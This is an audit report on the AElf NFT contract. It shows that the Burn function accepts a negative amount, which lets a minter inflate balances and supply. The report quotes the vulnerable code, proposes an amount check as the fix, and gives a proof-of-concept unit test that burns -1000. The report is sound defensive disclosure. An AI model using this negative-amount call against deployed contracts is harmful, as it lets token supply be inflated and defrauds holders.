# Audit Report

## Title
Negative Amount Bypass in NFT Burn Function Allows Arbitrary Balance Inflation

## Summary
The NFT contract's `Burn` function lacks validation for negative input amounts, allowing minters to arbitrarily inflate their NFT balances, protocol supply, and token quantities. When a negative amount is passed, the subtraction operation mathematically becomes addition, enabling unlimited NFT creation beyond protocol constraints.

## Finding Description

The vulnerability exists in the `Burn` function where it directly manipulates balances using `SafeMath.Sub()` without validating that the input amount is non-negative. [1](#0-0) 

The input amount field is defined as a signed `int64` type in the protobuf definition, allowing negative values to be passed by callers. [2](#0-1) 

While the `DoTransfer` helper function properly validates against negative amounts with an explicit check at line 48, the `Burn` function performs direct balance manipulation without calling `DoTransfer` or implementing equivalent validation. [3](#0-2) 

When a negative amount is passed (e.g., `-1000`), the security check at line 91 `State.BalanceMap[tokenHash][Context.Sender] >= input.Amount` passes because any positive balance is greater than a negative number. Subsequently, the `SafeMath.Sub()` operation at line 94 with a negative operand results in addition due to the mathematical identity: `a - (-b) = a + b`. [4](#0-3) 

For comparison, the MultiToken contract's `Burn` function properly validates amounts by calling `AssertValidToken`: [5](#0-4) 

Which internally validates that `amount > 0`: [6](#0-5) 

## Impact Explanation

**Critical Supply Invariant Violation:**
- Minters can inflate their NFT balance to arbitrary amounts (e.g., from 50 to 1,050 NFTs with a single malicious call using amount = -1000)
- Protocol supply can exceed `TotalSupply` limits, breaking the fundamental NFT scarcity guarantee enforced during minting
- Token quantity becomes inconsistent with actual minted amounts
- Enables unlimited NFT creation beyond protocol constraints without paying minting costs

**Affected Parties:**
- Existing NFT holders suffer severe dilution of their holdings
- NFT marketplace integrity is completely compromised
- Protocol economic model breaks down entirely
- Trust in the NFT platform is destroyed

This represents a complete breakdown of the token supply management system, equivalent to unlimited money printing.

## Likelihood Explanation

**Highly Likely to be Exploited:**

The `Burn` function is a public RPC method accessible to any caller: [7](#0-6) 

**Feasible Preconditions:**
- Attacker must be in the minter list for the target NFT protocol
- This is realistic as legitimate minters exist for every NFT protocol
- Minters are added through the `AddMinters` function by the protocol creator: [8](#0-7) 

- No other special permissions or complex contract states required

**Execution Practicality:**
- Single transaction with negative amount parameter
- No complex state setup or timing requirements
- Immediate and guaranteed success if attacker has minter privileges
- Zero gas cost constraints since operation succeeds immediately

**Economic Rationality:**
- Extremely rational for any malicious minter
- Effectively free NFT creation with zero minting cost
- Profit potential unlimited based on NFT market value
- Could be used to manipulate NFT markets or rug-pull investors

## Recommendation

Add explicit validation to ensure the amount parameter is positive before performing any state modifications:

```csharp
public override Empty Burn(BurnInput input)
{
    // Add validation for non-negative amount
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    var nftInfo = GetNFTInfoByTokenHash(tokenHash);
    var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
    Assert(nftProtocolInfo.IsBurnable,
        $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
    var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
    Assert(
        State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
        minterList.Value.Contains(Context.Sender),
        "No permission.");
    // ... rest of function
}
```

Alternatively, follow the same pattern as MultiToken by extracting validation into a helper method like `AssertValidAmount(long amount)` and calling it at the beginning of the Burn function.

## Proof of Concept

```csharp
[Fact]
public async Task Burn_NegativeAmount_InflatesBalance_Vulnerability()
{
    // Setup: Create NFT protocol and mint 50 NFTs to minter
    var symbol = await CreateTest();
    await AddMinterAsync(symbol);
    
    var tokenHash = (await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Quantity = 50,
        Owner = MinterAddress,
        Uri = "ipfs://test"
    })).Output;
    
    // Verify initial balance is 50
    var initialBalance = (await MinterNFTContractStub.GetBalanceByTokenHash.CallAsync(
        new GetBalanceByTokenHashInput
        {
            Owner = MinterAddress,
            TokenHash = tokenHash
        })).Balance;
    initialBalance.ShouldBe(50);
    
    // VULNERABILITY: Burn with negative amount (-1000)
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000  // Negative amount!
    });
    
    // Balance should have decreased, but instead increases due to vulnerability
    var finalBalance = (await MinterNFTContractStub.GetBalanceByTokenHash.CallAsync(
        new GetBalanceByTokenHashInput
        {
            Owner = MinterAddress,
            TokenHash = tokenHash
        })).Balance;
    
    // EXPLOIT CONFIRMED: Balance inflated from 50 to 1050
    finalBalance.ShouldBe(1050); // 50 - (-1000) = 1050
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L335-353)
```csharp
    public override Empty AddMinters(AddMintersInput input)
    {
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
        var minterList = State.MinterListMap[protocolInfo.Symbol] ?? new MinterList();

        foreach (var minter in input.MinterList.Value)
            if (!minterList.Value.Contains(minter))
                minterList.Value.Add(minter);

        State.MinterListMap[input.Symbol] = minterList;

        Context.Fire(new MinterListAdded
        {
            Symbol = input.Symbol,
            MinterList = input.MinterList
        });
        return new Empty();
    }
```

**File:** protobuf/nft_contract.proto (L45-46)
```text
    // Destroy nfts.
    rpc Burn (BurnInput) returns (google.protobuf.Empty) {
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L323-337)
```csharp
    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```
